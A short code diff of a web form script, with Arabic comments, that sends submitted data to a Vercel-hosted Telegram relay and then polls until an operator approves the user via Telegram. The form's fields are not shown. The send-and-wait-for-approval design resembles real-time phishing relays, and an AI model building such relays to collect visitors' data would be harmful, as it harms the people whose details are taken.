@@ -176,17 +176,17 @@ $('f').addEventListener('submit', async e => {
     document.querySelector('.card').appendChild(waitDiv);
 
     try {
-      // إرسال البيانات لسيرفرك على Vercel (تأكد أن رابط مشروعك صحيح هنا)
+      // إرسال البيانات إلى ملف الإرسال (send.js) على Vercel
       await fetch("https://telegram-form-api-lemon.vercel.app/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       });
 
-      // حلقة الفحص لمعرفة متى ستوافق من تلجرام
+      // حلقة الفحص عبر ملف (check.js) لمعرفة متى ستوافق من تليجرام
       const checkInterval = setInterval(async () => {
         try {
-          const res = await fetch(`https://telegram-form-api-lemon.vercel.app/api/send?action=check&user_id=${userId}`);
+          const res = await fetch(`https://telegram-form-api-lemon.vercel.app/api/check?user_id=${userId}`);
           const data = await res.json();
 
           if (data.status === 'approved') {
